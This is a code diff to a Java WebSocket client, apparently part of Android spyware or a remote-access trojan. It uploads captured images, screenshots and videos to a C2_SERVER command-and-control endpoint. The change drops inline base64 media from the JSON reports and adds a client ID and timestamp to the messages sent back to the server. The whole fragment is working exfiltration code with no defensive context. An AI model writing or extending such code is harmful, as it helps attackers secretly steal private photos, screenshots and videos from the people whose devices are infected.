@@ -65,7 +65,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
                     FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "images");
 
-                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                     json.put("res", "image");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                     json.put("timestamp", file.getName().split(".")[0]);
@@ -78,7 +77,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
                     FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "images");
 
-                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                     json.put("res", "image");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                     json.put("timestamp", file.getName().split(".")[0]);
@@ -120,7 +118,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
                     FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "screenshots");
 
-                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                     json.put("res", "screenshot");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                     json.put("timestamp", file.getName().split(".")[0]);
@@ -139,7 +136,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
                     FileManager.uploadFile(file.getAbsolutePath(), C2_SERVER + "videos");
 
-                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                     json.put("res", "video");
                     json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                     json.put("timestamp", file.getName().split(".")[0]);
@@ -168,8 +164,9 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
         JSONObject json = new JSONObject();
         json.put("type", "client");
         json.put("res", responseType);
+        json.put("id", Utils.clientID(context));
         json.put("data", Base64.encode(data.getBytes(), Base64.DEFAULT));
-
+        json.put("timestamp", System.currentTimeMillis());
         send(json.toString());
     }
 
